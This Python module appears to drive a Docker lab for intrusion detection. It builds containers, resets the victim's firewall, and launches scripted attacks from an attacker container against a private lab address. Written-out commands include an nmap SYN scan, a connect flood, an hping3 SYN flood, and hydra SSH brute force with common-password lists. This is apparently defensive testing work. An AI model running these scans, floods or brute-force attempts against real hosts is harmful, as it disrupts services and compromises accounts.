"""Control the Docker lab: build/up/down, run attacks from the attacker container, reset the firewall."""

from __future__ import annotations

import os
import shutil
import subprocess
import time
from functools import lru_cache
from pathlib import Path

from hrt.config import Settings

COMPOSE_FILE = Path(__file__).resolve().parent.parent.parent / "docker" / "docker-compose.yml"
VICTIM_IP = "10.10.0.10"


@lru_cache(maxsize=1)
def docker_exe() -> str:
    """Resolve the docker CLI: PATH first, then known Desktop install locations (per-user or
    Program Files). The per-user Docker Desktop install is not always on a fresh shell's PATH."""
    found = shutil.which("docker")
    if found:
        return found
    candidates = [
        Path(os.environ.get("LOCALAPPDATA", "")) / "Programs" / "DockerDesktop" / "resources" / "bin" / "docker.exe",
        Path(os.environ.get("ProgramFiles", "")) / "Docker" / "Docker" / "resources" / "bin" / "docker.exe",
    ]
    for c in candidates:
        if c.exists():
            return str(c)
    return "docker"  # last resort; will surface a clear error if truly missing


def _env() -> dict:
    """Ensure docker's own bin dir is on PATH so credential helpers (docker-credential-desktop)
    resolve during image pulls, even when the per-user Docker Desktop isn't on the shell PATH."""
    env = os.environ.copy()
    d = docker_exe()
    if os.path.sep in d:
        env["PATH"] = os.path.dirname(d) + os.pathsep + env.get("PATH", "")
    return env


def _compose(*args: str, check: bool = True, capture: bool = False) -> subprocess.CompletedProcess:
    base = [docker_exe(), "compose", "-f", str(COMPOSE_FILE)]
    return subprocess.run([*base, *args], check=check, text=True, capture_output=capture, env=_env())


def _exec(container: str, argv: list[str], detach: bool = False, capture: bool = True) -> subprocess.CompletedProcess:
    flags = ["-d"] if detach else []
    return subprocess.run([docker_exe(), "exec", *flags, container, *argv], text=True,
                          capture_output=capture, env=_env())


def build(settings: Settings) -> None:
    _compose("build")
    # the sandbox image is built directly (it isn't a compose service)
    subprocess.run([docker_exe(), "build", "-t", settings.sandbox_image,
                    str(COMPOSE_FILE.parent / "sandbox")], check=True, text=True, env=_env())


def up(settings: Settings) -> None:
    settings.zeek_dir.mkdir(parents=True, exist_ok=True)
    _compose("up", "-d")
    print("[lab] waiting for services ...")
    time.sleep(5)
    status()


def down(settings: Settings) -> None:
    _compose("down", "-v", check=False)


def status() -> None:
    _compose("ps", check=False)


def reset_firewall() -> None:
    r = _exec("hrt-victim", ["iptables-restore", "/etc/hrt/baseline.rules"])
    print("[lab] firewall reset to baseline" if r.returncode == 0 else f"[lab] reset failed: {r.stderr}")


def firewall_rules() -> list[str]:
    r = _exec("hrt-victim", ["iptables", "-S"])
    return r.stdout.splitlines() if r.returncode == 0 else []


# --- attacks -----------------------------------------------------------------------------
def attack(kind: str, target: str = VICTIM_IP) -> None:
    runners = {"scan": _scan, "synflood": _synflood, "sshbf": _sshbf, "benign": _benign, "connflood": _connflood}
    if kind not in runners:
        raise SystemExit(f"unknown attack '{kind}'; choose from {', '.join(runners)}")
    print(f"[lab] launching {kind} against {target}")
    runners[kind](target)


def _scan(target: str) -> None:
    # TCP SYN scan across a wide port range -> many half-open connections to distinct ports.
    r = _exec("hrt-attacker", ["nmap", "-sS", "-T4", "-p", "1-1024", "--max-retries", "1", target])
    print(r.stdout[-800:] or r.stderr[-800:])


def _connflood(target: str) -> None:
    r = _exec("hrt-attacker", ["nmap", "-sT", "-T5", "--min-rate", "800", "-p", "80", "-P0",
                               "--max-retries", "0", target])
    print(r.stdout[-400:] or r.stderr[-400:])


def _synflood(target: str) -> None:
    # hping3 SYN flood for ~8 seconds against port 80.
    _exec("hrt-attacker", ["sh", "-c", f"timeout 8 hping3 -S --flood -p 80 {target} || true"])
    print("[lab] SYN flood finished")


def _sshbf(target: str) -> None:
    # Repeated SSH auth attempts. Prefer hydra; fall back to an ssh loop if it isn't installed.
    probe = _exec("hrt-attacker", ["sh", "-c", "command -v hydra || true"])
    if probe.stdout.strip():
        _exec("hrt-attacker", ["sh", "-c",
              f"printf 'admin\\nroot\\ntest\\noracle\\nguest\\nuser\\n' > /tmp/u; "
              f"printf '123456\\npassword\\nadmin\\nroot\\ntoor\\nletmein\\n' > /tmp/p; "
              f"timeout 25 hydra -L /tmp/u -P /tmp/p -t 4 -f ssh://{target} || true"])
    else:
        _exec("hrt-attacker", ["sh", "-c",
              f"for i in $(seq 1 30); do timeout 2 ssh -o StrictHostKeyChecking=no -o "
              f"ConnectTimeout=1 baduser$i@{target} true 2>/dev/null; done"])
    print("[lab] SSH brute force finished")


def _benign(target: str) -> None:
    _exec("hrt-attacker", ["sh", "-c",
          f"for i in $(seq 1 15); do curl -s -o /dev/null http://{target}/; sleep 0.3; done"])
    print("[lab] benign burst finished")


def ensure_docker() -> bool:
    r = subprocess.run([docker_exe(), "info"], capture_output=True, text=True)
    if r.returncode != 0:
        print("[lab] Docker daemon not reachable; start Docker Desktop")
        return False
    return True
